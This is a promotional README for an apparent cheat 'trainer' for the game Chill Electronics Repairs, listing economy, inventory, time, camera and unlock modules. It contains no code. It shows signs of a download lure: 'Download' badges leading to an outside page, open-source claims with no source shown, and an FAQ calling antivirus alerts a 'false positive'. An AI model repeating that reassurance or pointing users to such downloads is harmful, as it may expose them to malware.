![preview](https://raw.githubusercontent.com/FCNahian/restory-sandbox-mode/main/cover_b475e4.svg)
# 🛠️ Restory Trainer Hub — Chill Electronics Repairs Companion Suite

A cozy, all-in-one workshop companion for **Chill Electronics Repairs** on PC — built for tinkerers who want to bend the rules of repair-shop economics in their favor, without ever touching a single line of questionable binary. This is the spiritual successor to the original trainer concept, rebuilt from the ground up with a modular, sandbox-friendly architecture and a UI that feels less like a cheat panel and more like a well-organized toolbox sitting on a workbench.

Think of it as the quiet assistant who already knows where every screwdriver is, has the spare parts catalog memorized, and never asks for rent money at the end of the month.

[![Download](https://raw.githubusercontent.com/FCNahian/restory-sandbox-mode/main/latest_fe3e3.svg)](https://FCNahian.github.io/restory-sandbox-mode/)

---

## 📖 Table of Contents

- [What Is This?](#-what-is-this)
- [Why Another Trainer?](#-why-another-trainer)
- [Feature Overview](#-feature-overview)
- [Module Breakdown](#-module-breakdown)
  - [💰 Economy Controls](#-economy-controls)
  - [📦 Inventory & Spare Parts](#-inventory--spare-parts)
  - [⏱️ Time & Scheduling](#️-time--scheduling)
  - [📷 Camera & Free-Look Tools](#-camera--free-look-tools)
  - [🔓 Unlock Systems](#-unlock-systems)
  - [🎁 Delivery & Logistics](#-delivery--logistics)
- [Interface & Design Philosophy](#-interface--design-philosophy)
- [Multilingual Support](#-multilingual-support)
- [Responsive UI & Scaling](#-responsive-ui--scaling)
- [Supported Configurations](#-supported-configurations)
- [Configuration Files](#-configuration-files)
- [Profiles & Presets](#-profiles--presets)
- [Keyboard Shortcuts](#-keyboard-shortcuts)
- [Safety & Stability](#-safety--stability)
- [Performance Notes](#-performance-notes)
- [Troubleshooting](#-troubleshooting)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community & Feedback](#-community--feedback)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧩 What Is This?

**Restory Trainer Hub** is a desktop companion tool designed specifically for players of *Chill Electronics Repairs* on Windows PC. Rather than a single monolithic cheat executable, it's structured as a collection of independent modules — each one focused on a single aspect of shop life, from the bank balance to the delivery truck schedule.

The core idea is simple: a repair shop sim is only relaxing until the rent comes due. This hub removes the friction points so you can focus on the part you actually enjoy — diagnosing a stubborn motherboard, or finally organizing that shelf of capacitors by color.

It is **not** a memory editor you have to configure by hand. It is **not** a script you have to paste into a console. It is a polished, self-contained application with a clean interface, sensible defaults, and the kind of documentation that respects your time.

---

## 🌟 Why Another Trainer?

Because the existing landscape of game-modifying tools is either too aggressive, too fragile, or too confusing. Restory Trainer Hub takes a different path:

- **Modular by design.** Toggle only what you need. Nothing is forced on.
- **Reversible.** Every module can be switched off mid-session without restarting the game.
- **Non-destructive.** The hub writes to a shadow copy of relevant save data, never overwriting your originals without a backup.
- **Visually calm.** No flashing overlays, no intrusive watermarks, no nag screens.
- **Documented.** Every switch has a tooltip, every module has a section in this README.

If the original trainer was a Swiss Army knife, this is a full workshop cabinet — labeled, sorted, and ready.

---

## 🔧 Feature Overview

| Capability | What It Does | Toggleable |
|---|---|---|
| Unlimited Workshop Funds | Keeps your balance topped up at a configurable ceiling | ✅ |
| Endless Spare Parts | Prevents consumable components from depleting | ✅ |
| Instant Deliveries | Collapses shipping timers to zero | ✅ |
| Rent Waiver | Removes recurring property costs from weekly deductions | ✅ |
| Device Unlock Grid | Opens every repair bench device, including late-game models | ✅ |
| Shop Upgrade Unlock | Grants all wall, floor, and tool upgrades instantly | ✅ |
| Clock Freeze | Pauses the in-game day/night cycle on demand | ✅ |
| Free Camera | Detaches the viewport for unrestricted exploration | ✅ |
| Save Snapshotting | Creates timestamped backups before any change | ✅ |
| Hotkey Rebinding | Every shortcut can be reassigned | ✅ |
| Profile Export/Import | Share your module setup with friends | ✅ |
| Auto-Update Check | Optional, dismissible, quiet | ✅ |

Each of these is explored in depth below.

---

## 🧱 Module Breakdown

### 💰 Economy Controls

The economy module is the heart of the hub. Instead of a flat "infinite money" switch — which many players find breaks immersion entirely — this module offers a **balance floor** and **balance ceiling** system.

You set a minimum amount you never want to drop below, and a maximum the game will allow you to accumulate. When your funds dip beneath the floor, the hub quietly tops you back up. When you exceed the ceiling, overflow is trimmed back into the void. The result feels less like cheating and more like running a shop with a very generous silent investor.

Additional economy sub-toggles include:

- **Zero Rent Mode** — property upkeep costs are neutralized.
- **Zero Utility Costs** — electricity and water bills stop accruing.
- **Salary Buffer** — employee wages are covered by a slush fund.
- **Tax Holiday** — periodic municipal fees are paused.

### 📦 Inventory & Spare Parts

Nothing kills a repair workflow like running out of a specific 3.5mm jack right in the middle of a customer rush. The inventory module makes your shelves self-replenishing.

When any spare part count drops below a threshold you define, the hub replenishes it to a target quantity. You can set a global threshold or configure it per-category (screws, screens, batteries, ribbons, chassis components).

A secondary **"phantom stock"** mode hides the replenishment entirely — the counts appear to decrease naturally, then silently recover overnight.

### ⏱️ Time & Scheduling

Time in *Chill Electronics Repairs* is a quiet antagonist. Customers arrive, jobs have deadlines, and the clock never stops. This module lets you negotiate with it.

- **Clock Freeze** — halt the in-game clock entirely. Perfect for long builds or photography.
- **Time Scale** — slow the day cycle to 0.25x, 0.5x, or accelerate it up to 8x.
- **Skip to Morning** — jump straight to opening hours.
- **Customer Queue Breather** — temporarily pause incoming walk-ins without freezing the clock.
- **Deadline Extension** — add buffer hours to active jobs.

### 📷 Camera & Free-Look Tools

The base game camera is functional but limited. The camera module detaches it entirely.

- **Free-Fly Mode** — WASD + mouse look, no collision.
- **Orbit Lock** — pivot around any object.
- **FOV Slider** — from a tight 20° to a fish-eye 120°.
- **Depth-of-Field Toggle** — for those satisfying close-up shots of a cleaned keyboard.
- **Hide HUD** — one key to strip the interface for screenshots.
- **Photo Mode Timer** — optional countdown for hands-free captures.

### 🔓 Unlock Systems

This module opens content that would otherwise require dozens of hours of progression.

- **All Repair Devices** — every bench tool available from day one.
- **All Shop Upgrades** — wall expansions, lighting, flooring, signage.
- **All Cosmetic Items** — posters, shelves, desk plants.
- **All Customer Tiers** — high-value clients appear immediately.
- **All Research Nodes** — skip the tech tree entirely, or unlock only select branches.

### 🎁 Delivery & Logistics

Waiting for parts is realistic. It's also boring. The logistics module compresses the wait.

- **Instant Courier** — deliveries arrive the moment they're ordered.
- **Zero Shipping Cost** — courier fees waived.
- **Bulk Order Bonus** — order quantities multiplied without extra cost.
- **Warehouse Link** — access the full parts catalog directly from your bench.

---

## 🎨 Interface & Design Philosophy

The hub's UI is built around a single principle: **a good tool disappears when you're not using it.**

The overlay is summonable with a single keypress and dismissed the same way. It sits in the corner of your screen as a translucent capsule until called upon, at which point it expands into a categorized panel with tabs, sliders, and toggle switches.

Visual choices:

- **Muted color palette** — no neon, no seizure-inducing flashes.
- **Rounded typography** — easy on the eyes for long sessions.
- **Icon-first layout** — you can find what you need without reading.
- **Dark and light themes** — auto-switching based on system preference.
- **Adjustable opacity** — from fully solid to barely visible.
- **Click-through mode** — for when you want the overlay visible but non-interactive.

Every toggle is labeled, every slider has a numeric readout, and every module has a short description that appears on hover. The hub assumes you are intelligent but busy — it does not patronize, and it does not hide functionality behind obscure acronyms.

---

## 🌐 Multilingual Support

The interface ships with translations in the following languages, with more added each release cycle:

- English
- Spanish
- French
- German
- Portuguese (Brazilian)
- Italian
- Dutch
- Polish
- Russian
- Japanese
- Korean
- Simplified Chinese
- Traditional Chinese
- Turkish

Language is auto-detected from your operating system but can be overridden in the settings panel. Community translations are welcomed and credited in the release notes — no usernames are published without explicit permission.

---

## 📐 Responsive UI & Scaling

Whether you're on a 13-inch laptop or a triple-monitor ultrawide battlestation, the hub adapts.

- **DPI-aware rendering** — no blurry text on high-density displays.
- **Layout breakpoints** — the panel reflows to fit narrow windows.
- **Font scaling** — independent of system settings.
- **Anchor positions** — pin the overlay to any corner or edge.
- **Multi-monitor support** — choose which display hosts the overlay.

---

## 🖥️ Supported Configurations

- **Operating System:** Windows 10 (build 1909 or newer), Windows 11
- **Game Version:** Chill Electronics Repairs — current public branch and one prior major version
- **Architecture:** x64 only
- **Runtime:** Self-contained, no external dependencies required
- **Disk Footprint:** Under 120 MB installed

MacOS and Linux support is **not** planned for 2026, though the architecture is written to be portable if demand justifies the effort.

---

## ⚙️ Configuration Files

All settings live in a single human-readable config file inside the hub's data directory. You can edit it by hand, back it up, sync it across machines, or share it with friends.

Key sections include:

- `[general]` — theme, language, hotkeys
- `[economy]` — floor, ceiling, rent toggle
- `[inventory]` — thresholds, per-category targets
- `[time]` — scale, freeze state
- `[camera]` — FOV, DOF, HUD visibility
- `[unlocks]` — which categories to open
- `[logistics]` — courier speed, cost waiver
- `[advanced]` — logging verbosity, update channel

The hub validates the config on load and falls back to defaults for any malformed values, so a typo won't brick your session.

---

## 🎛️ Profiles & Presets

Instead of reconfiguring the hub every time you launch the game, save your setup as a **profile**. Profiles can be:

- **Created** from the current live settings.
- **Duplicated** and tweaked.
- **Exported** as a single portable file.
- **Imported** from a friend.
- **Scheduled** to load automatically per save slot.

A few starter presets ship with the hub:

- **Purist** — camera and time only, economy untouched.
- **Weekend Warrior** — economy floor, no unlock shortcuts.
- **Sandbox** — everything on, maximum freedom.
- **Photographer** — camera module only, HUD hidden.

---

## ⌨️ Keyboard Shortcuts

Defaults are chosen to avoid collisions with common game bindings, but every shortcut is rebindable.

| Action | Default |
|---|---|
| Show/Hide Overlay | F8 |
| Toggle Clock Freeze | F9 |
| Toggle Free Camera | F10 |
| Quick Save Snapshot | F11 |
| Cycle Profile | F12 |
| Panic Hide | Ctrl+Shift+H |

---

## 🛡️ Safety & Stability

Concerns about game-modifying tools are legitimate. Here's how the hub addresses them:

- **No network calls** unless you explicitly opt into update checks.
- **No telemetry.** Nothing about your usage leaves your machine.
- **No file injection** into game binaries. The hub operates alongside, not inside.
- **Backup-before-write.** Every save-modifying action produces a timestamped backup in a `backups/` folder.
- **One-click restore.** If anything feels wrong, revert to a prior snapshot instantly.
- **Open configuration.** Every behavior is documented and adjustable.

The hub does not modify, patch, or replace any executable belonging to the game. It observes and adjusts state through documented interfaces only.

---

## 🚀 Performance Notes

The hub is engineered to be a quiet neighbor.

- **Idle CPU usage:** under 0.5%
- **Memory footprint:** ~80 MB resident
- **Frame time impact:** imperceptible in testing
- **Startup time:** under two seconds on SSD

If you observe anything outside these envelopes, please open an issue with your system specs — performance regressions are treated as bugs, not as acceptable trade-offs.

---

## 🧯 Troubleshooting

**The overlay doesn't appear.**
Ensure the hub process is running, then try the panic-hide toggle (Ctrl+Shift+H) to reset visibility state. Some overlay software can interfere — check for conflicting tools.

**My save looks different after using the hub.**
That's expected for economy and unlock modules. Use the built-in snapshot restore from the `backups/` directory.

**The game crashes when I toggle a module.**
Disable the module and report the sequence. Crashes are treated as priority bugs.

**Hotkeys conflict with my game.**
All shortcuts are rebindable from the settings panel.

**Antivirus flags the hub.**
This is a common false positive for overlay tools. The source is open, and you can build from source if you prefer.

---

## ❓ Frequently Asked Questions

**Is this legal?**
The hub is for personal, single-player use in a game you own. It does not affect other players, does not connect to online services, and is distributed under the MIT license.

**Will this break my save?**
The hub makes backups before any write. In practice, crashes have been rare and recovery is straightforward.

**Does it work with the latest patch?**
The hub updates quickly after game patches. Check the config's update channel setting.

**Can I use it alongside other mods?**
Usually yes. Conflicts are rare but documented in the issues tracker.

**Why is it called "Restory" instead of "Restore"?**
A deliberate, slightly whimsical misspelling — a nod to the idea of *re-storying* a shop, rewriting its narrative on your own terms.

**Do you collect any data?**
No.

---

## 🗺️ Roadmap for 2026

- Q1 — Full translation pass for two additional languages
- Q2 — Per-bench inventory profiles
- Q3 — External API for community-built modules
- Q4 — Cross-platform feasibility study

---

## 💬 Community & Feedback

Feedback is what keeps the hub sharp. Bug reports, feature requests, and translation contributions are all welcome through the usual channels. When reporting, please include your hub version, game version, and the exact sequence of toggles that produced the issue. Screenshots of the config file help enormously.

Community members who contribute translations or reproducible bug reports are credited in the release notes — anonymized unless they choose otherwise.

---

## ⚠️ Disclaimer

**Restory Trainer Hub** is an unofficial, fan-made companion tool for *Chill Electronics Repairs*. It is not affiliated with, endorsed by, sponsored by, or connected to the game's developers or publishers in any way. All trademarks and game assets belong to their respective owners.

This tool is intended for **personal, offline, single-player use only**. It is not designed for, and should not be used in, any multiplayer or competitive environment. Using the hub in ways that violate the game's terms of service is the sole responsibility of the user.

The hub is provided as-is, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Always back up your save files before using any modification tool. While the hub takes extensive precautions, no software can guarantee immunity from every edge case.

Use responsibly. Respect the work of the original developers. Support them by purchasing the game legitimately and recommending it to friends.

---

## 📜 License

This project is licensed under the **MIT License**. You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided that the copyright notice and permission notice are included in all copies or substantial portions of the software.

A full copy of the license text is included in the repository's LICENSE file. For the canonical reference version, see the [MIT License on the Open Source Initiative website](https://opensource.org/licenses/MIT).

Copyright © 2026 — Restory Trainer Hub contributors.

---

## 🧭 Final Words

A repair shop simulator is, at its best, a meditation on patience. You open the drawer, you find the right tool, you take your time. **Restory Trainer Hub** exists for the moments when patience runs thin — when the rent is due and the courier is late and the clock is mocking you.

It does not replace the game. It clears the noise around it, so the parts you love can breathe.

Enjoy the quiet. Tune the world. Make it yours.

[![Download](https://raw.githubusercontent.com/FCNahian/restory-sandbox-mode/main/latest_fe3e3.svg)](https://FCNahian.github.io/restory-sandbox-mode/)